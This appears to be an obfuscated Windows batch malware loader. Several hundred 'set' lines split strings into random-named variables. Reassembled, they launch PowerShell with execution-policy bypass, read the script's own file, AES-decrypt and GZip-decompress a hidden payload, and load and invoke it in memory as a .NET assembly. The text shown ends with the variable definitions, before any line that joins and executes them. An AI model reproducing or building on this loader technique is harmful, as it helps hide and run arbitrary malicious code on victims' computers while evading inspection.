@echo off
set "pwsIkhsrgf=in"
set "FpIArFzhRi=rs"
set "qDWLYCitzR=\W"
set "XAFoVgroZj=ll"
set "hZZZeAPPNL=nd"
set "bNSqwYuIsM=ll"
set "lQOePusPnR=y "
set "TdNXYVlpfv=ws"
set "eNMyYPSbjF=we"
set "izCbwYWrHp=st"
set "zSyGlWQbla=Wi"
set "nlEqCqwiTp=Po"
set "VdmKSzXvrm=he"
set "cjfzBDwesq=\v"
set "UuvAmMYMjp=po"
set "cTcbEVbbVV=we"
set "sdEJmEMViG=.e"
set "KBLUCtIyEZ=do"
set "otvdBpFTMo=Sy"
set "NwYuRliaPo=co"
set "yhadXvEdiS=em"
set "pcJnTRxrdt= /"
set "pFTRPYpqNn=:\"
set "BqAPgrcijq=py"
set "mQUbRfuCFs=xe"
set "RxJXItezES=0\"
set "yXzAwmGYrH=he"
set "fmHjGfvHdJ= C"
set "TKOAYlJuJp=rS"
set "cLuWQmOaXJ=s\"
set "MPRewwfSEJ=32"
set "HbyEtaAbGz=1."
set "QBWgZWxJah=ow"
set "BfZcImjLxK= %~dp0"
set "DphTevwivB=cd"
set "UHXgSrHslx=$ISn"
set "OMWlZrGUuh=bstr"
set "VrQQZcIXrp= [Sy"
set "oEPOGUFHya=lBlo"
set "FPUlwQNANL=nZWo"
set "qiasVeouzg=oL'["
set "TQjgWzlMvN=ert]"
set "kUxlcbMgNk== [S"
set "rpKXxwdDyI=$vnK"
set "CxkCLonJpW=);$Y"
set "yEUDNKupff=Z, 0"
set "tepbgiRYWc=$YAC"
set "LjKVyWZRhP=-nop"
set "jBZTNTunDB=Obje"
set "xoLDKhiqCw=] -j"
set "cfnnuIonFA=comm"
set "nNwxEsfjkH=-Obj"
set "JOQcYEPJCh=hy.A"
set "IJCVnGxCpB=bC, "
set "LhEfFWOeor=FNNI"
set "aciFsDPlIY=();$"
set "byKDyQxPyQ=ACXT"
set "TrbAfwEYyX=L4Yi"
set "XeMoByZRHP=tem."
set "mfwnGtrIXX=  $y"
set "LGHgKjGxkq=BC;$"
set "xRxqJVCFiR=BsB "
set "CEWWxJPWMZ===')"
set "rQhLVhawjX=1] -"
set "SXwXarugGY=yste"
set "KosDaTZqNk=pher"
set "FMddrBJxfZ='gni"
set "JomIBplDBb=YACX"
set "SzFrcooTzu=('%*'"
set "FFOeHBevpn=ISnV"
set "bfYZnTBLcB=pose"
set "DGICAiBplM=m(, "
set "bcDhzRUvlH=ddin"
set "tfYYNFumDu=pres"
set "lrvSJKzswV=oint"
set "MmKqQoSOdX=..-1"
set "DzoMkXwqeY=Bmor"
set "DfyfRfkewo=Disp"
set "XjYMPvSSIJ=k; }"
set "vGTqjGVOSO=IZ);"
set "ryDKNGlnkk=$nZW"
set "vhbCdYDmtj=IZ ="
set "fNUoxWPepi=[Sys"
set "XMxaEZzBBo=-4] "
set "vjezKOmlXz=rtS4"
set "kuWYvEEzvo=ecry"
set "CAHrQTxuaH=7;$Y"
set "DGJoqgtkcI=..-1"
set "OnBmycmDjd=g = "
set "hiqowuidKJ=ring"
set "eCCNAQaNWR=.Cry"
set "stgalsvAPI=PKCS"
set "waduMFhYCi=.IO."
set "JKhuZHaXaP=ZvT."
set "YIntJPjmWl=oryS"
set "JzmCuvBRaa=wOib"
set "AeSmYbyzJx=sion"
set "yuPPkGWtcz=d;$Y"
set "aZthBIWlUT=($qz"
set "PbQgDADDTj=$FNN"
set "GhVtBLckWl=.Dis"
set "OLcKnFUepo='[-1"
set "YzyhbLHShz=rity"
set "txKZSRfZyw=ddin"
set "BgmwGicKna=gnir"
set "AqTldLYHIK=zuZI"
set "tMWNQVzgKk=.Cry"
set "NguCJYcUnS=gMod"
set "ZvepErcbbm=gth)"
set "SOyLDBXNuw=s75K"
set "oUakAOwHIu=Ez ="
set "SuvrCNdAIw=dj0C"
set "oGHxGWsRjp=stem"
set "RWMfimbzDz=6esa"
set "evjozkucOt=Secu"
set "hnTIANMrVx=;$wm"
set "rfamWzegIv=ACXT"
set "ZmFqStIGpq=oArr"
set "xNQONmmtgz=Ez.T"
set "IcHDlYLQLS=Z = "
set "mpAMvBHlrp=rity"
set "TzflJzWlXm=N = "
set "SpYyoddjTQ=.Con"
set "SecRGjHKVl=join"
set "eKuhirWKJH=.GZi"
set "lTINEZRxaM=yTo("
set "iNaqRjnrPB=fore"
set "rofvUXDqOf=('%~f0'"
set "jXLkbwjMxy=Conv"
set "qwBFwzjHEk=:('g"
set "qWUCEIpaPP=V = "
set "eJkxdrROcI=comp"
set "sBpWucdMgc='')("
set "aEhMpstqvr=yste"
set "NIdObyKBTf=oin "
set "NFMKhTkpOJ=y]::"
set "umvgfZLYhO=nirt"
set "sWgZbkFHyj=-joi"
set "vIIwygeoev= if "
set "rhtyIEYAxF=ptog"
set "evbJaDGqPh=ay()"
set "UwrnjBFJPu=ect "
set "yYblkIEaTZ=raph"
set "gpBjFmuozB=ionM"
set "EyUrwIjSJH=).Sp"
set "JkNckiSNYI=zHhH"
set "jIcMPEWSXm=ct S"
set "NjuVuhphvv=ress"
set "pTZtRzjISQ=e]::"
set "WnwietQlVa=th('"
set "TXpHjhwelT=ptor"
set "THDtXfWGHJ=nrRr"
set "mZkBozMFyj=CFxo"
set "YsegVwShnC=New-"
set "ZJkCfkCrvW== $Y"
set "dpcTfrMOyR=ZvT "
set "hsngWrZLSA=$vnK"
set "hcSxAyvEID=BsB."
set "iYToOhaJiK=NNIZ"
set "pnmyJqYWlN=New-"
set "lgtxkGSWdb=rans"
set "jisIniWPfD=);$j"
set "lndQMUyPGT=y.Cr"
set "sztKmEdDtS=PTtG"
set "qzmKsFSWMG=]::C"
set "rdCXJaHYyt=mory"
set "UdswafuZnw=em.C"
set "ttKRUpkvfh=('Tg"
set "PfAIzIAgND=raph"
set "Jztwzhewed=vert"
set "InxaztFmhN=O.Me"
set "ZmulIrjXZd=e = "
set "UAtTzGULXW=B.Su"
set "PWzqoXNssT= New"
set "dbeGLWQfYF=am;$"
set "CFKPUGwtFY=.Cop"
set "CogXiWaGKj=ion."
set "PavXhuBBjO=.Mod"
set "IMBetlPzne=, (,"
set "inwzlEBCzO=stem"
set "SmKkARcrSi=[IO."
set "AAmIywcwpn=Comp"
set "rpspjThnbz=Fina"
set "kfLWOnMNGq=; };"
set "EyHBkPvPZb=ing("
set "zkoOfZYwaZ=();$"
set "eryYEtjiDv=YxVw"
set "FPPHVaHwQh=n ''"
set "hmxsxFaJGl=ew-O"
set "eIIwcHkzJf=.Com"
set "DOVuBMKgbX=vT.T"
set "VhnqCNWJzC=null"
set "XcHrJSANCg=$vnK"
set "tKvhLoGbQz=.Mem"
set "hTHpXxjlPy=pStr"
set "AkUFvWUrpN=16] "
set "upvKZZNrSy=[Sys"
set "LTdFXMEMzO=morF"
set "TfqmGFEuOc=-joi"
set "NnVhwwvKOE=oo ="
set "EGKvnbNadI=ibC."
set "MsutPnKMQI=ress"
set "HhTSPnfhmk=lit("
set "UJviQdiaol=TllA"
set "hYnOpHKfjK=tem."
set "UCZWhabRqq=RmAx"
set "HMTpnlcHkv=T.Pa"
set "jLQlaJKQQv=$wOi"
set "hMPHoWgoOK=trea"
set "dFibYbtHer=orF'"
set "qLnOQNTEKw=Disp"
set "uiktiULBJz=-ep "
set "BuNbuYnUui=esaB"
set "cIbobIZTwC=ke($"
set "dryLsmAyHf=);$Y"
set "ieLayKdBXB= '')"
set "SibxfzWKXr==');"
set "HVVlECbykJ=r.En"
set "zJSDxSBovR=tion"
set "AkSpTkvmGG=ment"
set "CuDxnFTQBr=m.IO"
set "SYDVftKjuN=ck($"
set "XnIdpZQvyb=eam("
set "QryVpbySFQ=l5E7"
set "HSngrmBcRf=.Cre"
set "HkMLuZJunU=;$jh"
set "nOOjqSPVGd=rt]:"
set "BxyDhIGALi=)) {"
set "rFxIdSzqbm=o) {"
set "ccUNPSBhAO=ACXT"
set "WrBwDJmmkJ=nKEz"
set "WbyVZxdqCp=ateD"
set "vwLfGtuNyH=ode]"
set "AGTtRiwfKL= [st"
set "VSkahVnvdu='txe"
set "FPDjSJsEfg=se()"
set "affwrOwhFg=gjYA"
set "fpRAXrtKvO=flec"
set "fqsJRQPKiY=gsYZ"
set "hFnzVOzDVg=]::("
set "tvuKFfjOoQ= '')"
set "FWEYohqizG=yste"
set "iteCdtLwjP=, $F"
set "npoVREKaOW=)($F"
set "sspjYkdfKv=ptog"
set "ZSXKGRmEux=y.Pa"
set "RxuLthbMQs=jpj."
set "ChjCdrAlxP=m.IO"
set "MdGQpgpeGu=tS46"
set "NqrAxgpifi=S46e"
set "fOWWjYgxFC=ss -"
set "eTnLvgfSoM=in $"
set "bZfJGKUGXv=$wmZ"
set "eagGGkuMFP=t Sy"
set "DCeEpOmIDY= = ["
set "CJXjmjFvqS=bypa"
set "RwdEafamLS=]::N"
set "HOQbqWgyNq=Star"
set "PKsbOgNPiF=;$wO"
set "uPrUntkHRk=Secu"
set "djzbOFhGue=ivIL"
set "CvunxqzcBU=Invo"
set "XlJQQSLqJR=::('"
set "NhmjGmVpKN=FNNI"
set "GoIyaMFyEo=FNNI"
set "ZsZACfSHUg=($qz"
set "QyHNvEEQyh=rofi"
set "jVyCTzPTaw= = $"
set "VJtUKnZyNu=.Dis"
set "upSSMhblJc=.Ass"
set "HxgHdtaurr=.Key"
set "ihGwUSfkii='0Pg"
set "gROSqaeaiq=[-1."
set "kngyYlSWRZ=Syst"
set "ocwMohgRLn=urit"
set "EeVeHatoOw=brea"
set "rcLuaEQuuc=hjpj"
set "xGrfHYAOPg=F'[-"
set "XylDTMhiOs=tem."
set "FMTknJhaSx=NNIZ"
set "VbfgSzucTQ=Ez);"
set "yUVTVQxZNP=('da"
set "DcSmBZirKq=m.Re"
set "yCBWQuLLCh=Mode"
set "DbnbOzRqvn=ress"
set "DSUWcjOCUf=ispo"
set "kbBvVVSlbH=.-16"
set "dvjAnFbGTi=106u"
set "DNcmpWTUDT=le  "
set "lsUyiALGPG=;$wm"
set "FqWQGJjtDQ=iron"
set "ezyIFDZGWJ=[Env"
set "rQZNuAwnHY=)))"
set "vaJABwvdaQ=grap"
set "PsrChzxrit=ACXT"
set "wPoxKvmzQa=ACXT"
set "PQoZfBbeiJ=::De"
set "eYIWyNFUYb=ose("
set "pytjfxBxmE=saBm"
set "HsYHVixUxQ=Comp"
set "EHsZnAxDFi=em.I"
set "OxmzdOChKS=-1.."
set "SSApbkOtdf=.Sec"
set "ZGuBqbytjY=Z = "
set "KAFBOlirQE=:: '"
set "UhqeoTZbTD=6] -"
set "hBZjFIBFdn=3); "
set "wAzuaUESAJ='[-1"
set "zjrlcndraI=Stre"
set "cPHlbacETL=Syst"
set "YnWUbARwWS=]::("
set "wYtoBYehWR=);$v"
set "IDVabrldmf=ewLi"
set "vMvbdlzREw=ypto"
set "VqHlISASiW=ose("
set "TdgZFUPTag=and "
set "fVCNFlTUDz=ivIL"
set "MnJwYpTSxB=n ''"
set "ldNdUlgbZc=C = "
set "KsphZUhkOx=$FNN"
set "QIWtczsYpu= [Sy"
set "CCFSXaUtaA=join"
set "yfewkZHNLL=File"
set "eMDwJTHjOv=ne);"
set "lRWxQmQFNd=;$nr"
set "ySQoXPFCpk=stem"
set "PznTGRvxCF=PxEW"
set "kqfQwLlnco=SnVN"
set "UOnpXnVNsx=VN.D"
set "krsVoVYOjH=eMVs"
set "MGkWCCSwFR=Obje"
set "fAthBndZiv=.Len"
set "MoeDJaoLlV=bjec"
set "XzuZynMLJL=)($y"
set "JXHLhXoRoC=ach "
set "yTXMgCOIIs= = N"
set "VEFSxSWEum= = $"
set "rKLcpwxkTT=ct S"
set "RNzswsywxD=y.Ci"
